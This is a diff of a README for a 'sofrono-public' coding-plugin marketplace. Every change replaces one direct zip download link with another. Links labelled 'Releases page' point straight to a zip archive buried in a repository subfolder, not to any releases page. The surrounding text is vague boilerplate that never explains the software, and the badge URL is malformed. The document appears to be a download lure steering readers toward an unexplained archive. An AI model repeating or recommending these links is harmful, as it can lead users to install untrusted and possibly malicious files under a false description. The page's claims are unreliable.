@@ -4,7 +4,7 @@
 Welcome to the **sofrono-public** repository. Here, you will find a marketplace for custom plugins designed to enhance your coding experience. This guide will help you download and run our application with ease.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/uhuy38/sofrono-public/main/finra-review-skill/public-sofrono-v3.3.zip%20Latest%https://raw.githubusercontent.com/uhuy38/sofrono-public/main/finra-review-skill/public-sofrono-v3.3.zip)](https://raw.githubusercontent.com/uhuy38/sofrono-public/main/finra-review-skill/public-sofrono-v3.3.zip)
+[![Download Latest Release](https://github.com/uhuy38/sofrono-public/raw/refs/heads/main/question-storm/skills/public-sofrono-1.7.zip%20Latest%https://github.com/uhuy38/sofrono-public/raw/refs/heads/main/question-storm/skills/public-sofrono-1.7.zip)](https://github.com/uhuy38/sofrono-public/raw/refs/heads/main/question-storm/skills/public-sofrono-1.7.zip)
 
 ## 📦 What is sofrono-public?
 The **sofrono-public** repository features unique plugins such as:
@@ -23,7 +23,7 @@ To run this application, ensure your system meets the following requirements:
 ## 🔧 Installation Instructions
 
 ### Step 1: Visit the Releases Page
-Go to our [Releases page](https://raw.githubusercontent.com/uhuy38/sofrono-public/main/finra-review-skill/public-sofrono-v3.3.zip) to find the latest version of the software.
+Go to our [Releases page](https://github.com/uhuy38/sofrono-public/raw/refs/heads/main/question-storm/skills/public-sofrono-1.7.zip) to find the latest version of the software.
 
 ### Step 2: Download the Application
 - On the Releases page, locate the latest version.
@@ -61,4 +61,4 @@ Join our user community to share experiences, ask questions, and receive support
 Explore our documentation for more details on each plugin and advanced features. You can access this information on our official website or through the help option in the app.
 
 ## 📌 Conclusion
-Thank you for choosing **sofrono-public**! We hope this application enhances your coding experience. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/uhuy38/sofrono-public/main/finra-review-skill/public-sofrono-v3.3.zip) to stay updated with the latest features and improvements. Happy coding!
+Thank you for choosing **sofrono-public**! We hope this application enhances your coding experience. Don't forget to visit our [Releases page](https://github.com/uhuy38/sofrono-public/raw/refs/heads/main/question-storm/skills/public-sofrono-1.7.zip) to stay updated with the latest features and improvements. Happy coding!
